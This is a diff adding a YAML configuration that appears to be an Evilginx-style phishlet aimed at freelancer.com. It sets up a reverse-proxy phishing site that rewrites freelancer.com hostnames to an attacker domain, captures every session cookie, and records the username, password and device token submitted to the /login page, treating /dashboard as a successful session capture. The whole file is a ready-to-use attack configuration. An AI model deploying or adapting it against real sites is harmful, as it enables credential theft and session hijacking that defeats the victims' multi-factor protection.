@@ -1,0 +1,38 @@
+author: '@hash3liZer'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'freelancer.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'freelancer.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 't', orig_sub: 't', domain: 'freelancer.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'notifications', orig_sub: 'notifications', domain: 'freelancer.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'freelancer', orig_sub: 'freelancer', domain: 'arrow.com', session: true, is_landing: false, auto_filter: false}
+sub_filters:
+  - {triggers_on: 'www.freelancer.com', orig_sub: 'www', domain: 'freelancer.com', search: 'www.freelancer.com', replace: 'www.{domain}', mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'www.freelancer.com', orig_sub: 'www', domain: 'freelancer.com', search: 't.freelancer.com', replace: 't.{domain}', mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'www.freelancer.com', orig_sub: 'www', domain: 'freelancer.com', search: 'notifications.freelancer.com', replace: 'notifications.{domain}', mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'www.freelancer.com', orig_sub: 'www', domain: 'freelancer.com', search: 'freelancer.arrow.com', replace: 'freelancer.{domain}', mimes: ['text/html', 'text/javascript']}
+auth_tokens:
+  - domain: '.freelancer.com'
+    keys: ['.*,regexp']
+  - domain: 'www.freelancer.com'
+    keys: ['.*,regexp']
+  - domain: 'freelancer.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'device_token'
+      search: '(.*)'
+      type: 'post'
+auth_urls:
+  - '/dashboard'
+login:
+  domain: 'www.freelancer.com'
+  path: '/login'
